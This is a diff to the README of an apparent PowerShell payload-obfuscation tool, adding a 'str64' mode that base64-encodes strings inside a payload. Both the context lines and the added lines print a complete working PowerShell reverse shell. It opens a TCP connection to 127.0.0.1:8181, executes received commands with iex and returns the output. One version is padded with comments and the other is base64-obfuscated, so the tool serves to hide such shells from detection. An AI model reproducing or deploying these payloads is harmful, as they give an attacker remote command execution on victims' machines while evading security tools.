@@ -67,6 +67,15 @@ PS C:\auto_powershell_obfuscation> python .\obfuscator.py -f .\payload.txt -m co
 $client <#*********************************#>=<#*******************************#> New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181);$stream <#*********************************#>=<#*******************************#> $client.GetStream();[byte[]]$bytes <#*********************************#>=<#*******************************#> 0..65535|%{0};while(($i <#*********************************#>=<#*******************************#> $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data <#*********************************#>=<#*******************************#> (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback <#*********************************#>=<#*******************************#> (iex $data 2>&1 | Out-String );$sendback2 <#*********************************#>=<#*******************************#> $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte <#*********************************#>=<#*******************************#> ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
+### str64
+
+**str64** mode will base64 encode your strings, then decode them in your payload
+
+```powershell
+PS C:\auto_powershell_obfuscation> python .\obfuscator.py -f .\payload.txt -m str64   
+$client = New-Object System.Net.Sockets.TCPClient([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTI3LjAuMC4x')),8181);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UFMg')) + (pwd).Path + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PiA='));$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
 ### Entropy
 
 **entropy** mode allows you to calculate the entropy of your payload.
